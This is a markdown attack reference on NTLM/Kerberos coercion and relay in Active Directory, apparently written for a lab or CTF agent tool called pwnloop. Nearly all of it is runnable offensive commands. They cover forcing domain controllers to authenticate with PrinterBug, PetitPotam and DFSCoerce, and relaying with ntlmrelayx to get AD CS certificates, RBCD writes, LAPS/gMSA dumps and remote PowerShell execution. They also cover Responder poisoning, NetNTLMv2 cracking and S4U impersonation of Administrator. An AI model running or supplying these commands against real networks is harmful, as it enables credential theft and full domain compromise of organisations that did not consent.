# NTLM/Kerberos coercion and relay

Relay turns "a privileged account authenticated to me" into "I act as that
account". On labs the chain is almost always: **coerce** a privileged machine
(usually the DC) to authenticate to your listener → **relay** that auth to a
service that doesn't require signing → get a cert (ESC8/ESC11), an RBCD write, or
a shell.

The whole technique dies to signing/EPA. Check first what is relayable:

```bash
pwnloop x "nxc smb $T --gen-relay-list relay.txt"     # hosts with SMB signing OFF
pwnloop x "nxc smb $T | grep -i signing"              # 'signing:False' = relay target
pwnloop x "nxc ldap $T -u <u> -p <p> -M ldap-checker" # LDAP signing / channel binding
```

## Coercion primitives (force the callback)

All of these make a *remote* Windows host authenticate to a host you name. Run
them from the container; the callback lands on your `tun0` (or on the relay
listener). Enumerate reachable ones with Coercer rather than guessing:

```bash
pwnloop x "coercer scan -u <u> -p <p> -d <dom> -t $T"
```

| Protocol | Trigger | Tool |
|----------|---------|------|
| MS-RPRN (PrinterBug) | `RpcRemoteFindFirstPrinterChangeNotificationEx`, spooler pipe | `printerbug.py` |
| MS-EFSR (PetitPotam) | EfsRpc* — often works **unauthenticated** on unpatched DCs | `PetitPotam.py` |
| MS-DFSNM (DFSCoerce) | `NetrDfsAddStdRoot` — hits the DC's DFS service | `dfscoerce.py` |
| MS-FSRVP (ShadowCoerce) | shadow-copy RPC | `shadowcoerce.py` |
| MS-DTYP/others | broad sweep | `coercer coerce` |

```bash
pwnloop x "python3 printerbug.py '<dom>/<u>:<p>'@$T <tun0-ip>"
pwnloop x "python3 PetitPotam.py -u <u> -p <p> -d <dom> <tun0-ip> $T"
pwnloop x "python3 dfscoerce.py -u <u> -p <p> -d <dom> <tun0-ip> $T"
pwnloop x "coercer coerce -u <u> -p <p> -d <dom> -t $T -l <tun0-ip>"
```

**SMB→SMB relay is usually dead** (DC signing mandatory). Force **HTTP/WebDAV**
instead — needs the target's `WebClient` service running (common on
workstations, rare on a DC). Specify the listener as `ATTACKER@80/share`:

```bash
pwnloop x "python3 printerbug.py '<dom>/<u>:<p>'@$T 'ATTACKER@80/share'"
pwnloop x "coercer coerce -u <u> -p <p> -d <dom> -t $T -l ATTACKER --http-port 80"
```
Check WebClient presence first: `nxc smb $T -u <u> -p <p> -M webdav`.

## Relay targets (where the coerced auth goes)

Start `ntlmrelayx` on your host, then coerce. Pick the target by what you want:

```bash
# → AD CS cert for the coerced account (ESC8). DC account → DomainController tpl.
pwnloop x "impacket-ntlmrelayx -t http://ca.<dom>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController"

# → LDAP: set RBCD on the relayed machine, or dump the domain
pwnloop x "impacket-ntlmrelayx -t ldaps://$T --delegate-access --no-dump --escalate-user <youruser>"
pwnloop x "impacket-ntlmrelayx -t ldap://$T --dump-laps --dump-gmsa"

# → SMB shell on a host with signing OFF (relay list from nxc)
pwnloop x "impacket-ntlmrelayx -tf relay.txt -smb2support -c 'powershell -enc <b64>'"

# → SOCKS: keep the authenticated session open to reuse
pwnloop x "impacket-ntlmrelayx -tf relay.txt -smb2support -socks"
```

Then finish the RBCD path from Linux with S4U (see `references/ad.md`):
```bash
pwnloop x "impacket-getST -spn cifs/<target-fqdn> -impersonate Administrator -dc-ip $T '<dom>/<pc>\$:<pw>'"
```

## When every network relay is dead — local relay

Outbound `80/139/445` blocked, `WebClient` absent, SMB signing mandatory, LDAP
SASL signing required (relayed binds can't sign: `389`→UNAVAILABLE,
`636`→UNWILLING_TO_PERFORM) — that lockdown *is the signpost* that the intended
path is a **local** Kerberos relay via a DCOM trigger, needing no egress. Full
worked chain (CLSID choice, `KrbRelayUp`, S4U) is in `references/ad.md` under
"Local Kerberos relay → RBCD".

## Capture instead of relay

If nothing is relayable, capture and crack. Poison name resolution or catch the
coerced hash:
```bash
pwnloop x "responder -I tun0 -wv"       # LLMNR/NBT-NS/mDNS + WPAD; grab NetNTLMv2
pwnloop x "impacket-ntlmrelayx ... " # or just let a capture server log it
```
NetNTLMv2 → `john --format=netntlmv2` / `hashcat -m 5600`. A machine-account
hash (`HOST$`) rarely cracks; relay it instead.

## Prove the listener is up before you conclude the coercion failed

A coercion that returns `ERROR_BAD_NETPATH` and a listener log that says nothing look
exactly like a filtered target. Both readings are wrong more often than not, and both
are cheap to falsify. Establish, in this order:

1. **The listener is actually bound.** impacket's relay/capture tools (`ntlmrelayx`,
   `krbrelayx`) run their servers as *daemon threads* and block the main thread on
   `sys.stdin.readline()`. Under a non-interactive exec (`pwnloop x`, `docker exec`,
   any `ssh host cmd`) stdin is at EOF, the read returns immediately, the main thread
   exits and every listening socket dies with it — **after** the tool has already
   printed `Servers started, waiting for connections` and with exit status 0. Hold
   stdin open, and verify the bind rather than trusting the banner:
   ```bash
   pwnloop x "cd /engagements/<e>/loot; tail -f /dev/null | python3 -u /opt/krbrelayx/krbrelayx.py -hashes :<rc4> > krb.log 2>&1"
   pwnloop x "ss -lntp | grep -E ':445|:80 '"     # this is the proof, not the banner
   ```
2. **The target can reach you.** Test egress *against a socket that accepts*. A closed
   port and a filtered port are indistinguishable to `Test-NetConnection`, `nc -z` or a
   SYN probe, so a sweep run with nothing listening reports everything blocked. Bind a
   throwaway multi-port listener first, then sweep from the target — a shell on the box
   is the cleanest place to do it:
   ```powershell
   foreach ($p in 445,80,443,8080,8443) { "$p = $((Test-NetConnection <you> -Port $p -WarningAction SilentlyContinue).TcpTestSucceeded)" }
   ```
3. **The key matches the ticket's etype.** A captured ticket is encrypted with the
   account's key at whatever etype the KDC chose — for a machine account whose password
   you just set, often RC4 rather than AES:
   `Could not find the correct encryption key! Ticket is encrypted with keytype 23, but
   keytype(s) 18 were supplied`. Supply both forms (`-hashes :<NT>` and `-aesKey <k>`);
   the NT hash is just `MD4(pw.encode('utf-16-le'))`.

The general rule: **a negative result is only evidence if the probe could have returned
a positive one.** Verify the instrument, then believe what it says about the target.
